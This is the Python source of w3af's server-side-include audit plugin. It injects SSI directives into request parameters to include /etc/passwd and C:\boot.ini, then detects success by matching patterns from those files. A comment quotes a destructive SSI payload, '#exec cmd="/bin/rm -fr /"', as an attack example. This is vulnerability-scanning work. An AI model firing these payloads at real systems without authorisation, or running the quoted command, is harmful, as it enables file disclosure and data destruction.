'''
ssi.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


from core.data.fuzzer.fuzzer import *
import core.controllers.outputManager as om
from core.controllers.basePlugin.baseAuditPlugin import baseAuditPlugin
import core.data.kb.knowledgeBase as kb
from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser
import core.data.kb.vuln as vuln
import core.data.constants.severity as severity
import re

class ssi(baseAuditPlugin):
    '''
    Find server side inclusion vulnerabilities.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAuditPlugin.__init__(self)
        
        self._fuzzableRequests = []

    def _fuzzRequests(self, freq ):
        '''
        Tests an URL for server side inclusion vulnerabilities.
        
        @param freq: A fuzzableRequest
        '''
        om.out.debug( 'ssi plugin is testing: ' + freq.getURL() )
        
        # Used in end()
        self._fuzzableRequests.append( freq )
        
        oResponse = self._sendMutant( freq , analyze=False ).getBody()
        ssiStrings = self._getSsiStrings()
        mutants = createMutants( freq , ssiStrings, oResponse=oResponse )
            
        for mutant in mutants:
            if self._hasNoBug( 'ssi', 'ssi', mutant.getURL() , mutant.getVar() ):
                # Only spawn a thread if the mutant has a modified variable
                # that has no reported bugs in the kb
                targs = (mutant,)
                self._tm.startFunction( target=self._sendMutant, args=targs, ownerObj=self )
        
        
    def _getSsiStrings( self ):
        '''
        This method returns a list of server sides to try to include.
        
        @return: A string, see above.
        '''
        localFiles = []
        localFiles.append("<!--#include file=\"/etc/passwd\"-->")   
        localFiles.append("<!--#include file=\"C:\\boot.ini\"-->")
        
        ### TODO: Add mod_perl ssi injection support
        #localFiles.append("<!--#perl ")
        
        return localFiles
    
    def _analyzeResult( self, mutant, response ):
        ssiErrorList = self._findFile( response )
        for ssiError in ssiErrorList:
            if not re.search( ssiError, mutant.getOriginalResponseBody(), re.IGNORECASE ):
                v = vuln.vuln( mutant )
                v.setName( 'Server side include vulnerability' )
                v.setSeverity(severity.HIGH)
                v.setDesc( 'Server Side Include was found at: ' + response.getURL() + ' . Using method: ' + v.getMethod() + '. The data sent was: ' + str(mutant.getDc()) )
                v.setId( response.id )
                kb.kb.append( self, 'ssi', v )
    
    def end(self):
        '''
        This method is called when the plugin wont be used anymore.
        '''
        self._tm.join( self )
        
        for fr in self._fuzzableRequests:
            self._sendMutant( fr )
            # The _analyzeResult is called and "permanent" SSI's are saved there to the kb
            # Example where this works:
            '''
            Say you have a "guestbook" (a CGI application that allows visitors to leave messages for everyone to see)
            on a server that has SSI enabled. Most such guestbooks around the Net actually allow visitors to enter HTML 
            code as part of their comments. Now, what happens if a malicious visitor decides to do some damage by 
            entering the following:

            <--#exec cmd="/bin/rm -fr /"--> 

            If the guestbook CGI program was designed carefully, to strip SSI commands from the input, then there is no problem. 
            But, if it was not, there exists the potential for a major headache!
            '''
            
        self.printUniq( kb.kb.getData( 'ssi', 'ssi' ), 'VAR' )
            
    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
        </OptionList>\
        '

    def setOptions( self, OptionList ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter OptionList: A dictionary with the options for the plugin.
        @return: No value is returned.
        ''' 
        pass
        
    def _findFile( self, response ):
        '''
        This method finds out if the server side has been successfully included in 
        the resulting HTML.
        
        @parameter response: The HTTP response object
        @return: A list of errors found on the page
        '''
        res = []
        for filePattern in self._getFilePatterns():
            match = re.search( filePattern, response.getBody() , re.IGNORECASE )
            if  match:
                om.out.information('Found server side include. The section where the file is included is (only a fragment is shown): "' + response.getBody()[match.start():match.end()] + '". The error was found on response with id ' + str(response.id) + '.')
                res.append(filePattern)
        return res
    
    def _getFilePatterns(self):
        '''
        @return: A list of strings to find in the resulting HTML in order to check for server side includes.
        '''
        filePatterns = []
        filePatterns.append("root:x:0:0:")  
        filePatterns.append("daemon:x:1:1:")
        filePatterns.append(":/bin/bash")
        filePatterns.append(":/bin/sh")
        filePatterns.append("\\[boot loader\\]")
        filePatterns.append("default=multi\\(")
        filePatterns.append("\\[operating systems\\]")
        return filePatterns
        
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []

    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin finds server side include (SSI) vulnerabilities.
        '''
